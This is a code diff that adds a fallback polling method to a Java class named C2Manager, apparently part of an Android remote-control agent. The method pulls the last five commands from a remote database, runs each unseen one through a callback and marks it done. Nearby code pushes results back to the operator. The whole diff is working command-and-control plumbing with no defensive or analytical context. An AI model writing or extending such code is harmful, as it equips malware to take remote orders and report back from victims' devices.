@@ -74,6 +74,24 @@ public class C2Manager {
             });
     }
 
+    // fallback poll: fetch last five commands, skip any we've already run
+    public static void pollCommands(Context ctx, CommandCallback cb) {
+        agentRoot(ctx).child("meta").child("lastCmdKey").get()
+            .addOnCompleteListener(task -> {
+                String lastKey = task.isSuccessful()
+                    ? task.getResult().getValue(String.class) : null;
+                agentRoot(ctx).child("commands").orderByKey().limitToLast(5).get()
+                    .addOnCompleteListener(t2 -> {
+                        if (!t2.isSuccessful() || t2.getResult() == null) return;
+                        for (DataSnapshot s : t2.getResult().getChildren()) {
+                            if (lastKey != null && lastKey.compareTo(s.getKey()) >= 0) continue;
+                            cb.onCommand(s);
+                            agentRoot(ctx).child("meta").child("lastCmdKey").setValue(s.getKey());
+                        }
+                    });
+            });
+    }
+
     public static void pushResult(Context ctx, String cmdKey, Map<String, Object> result) {
         Map<String, Object> payload = new HashMap<>(result);
         payload.put("ts", System.currentTimeMillis());
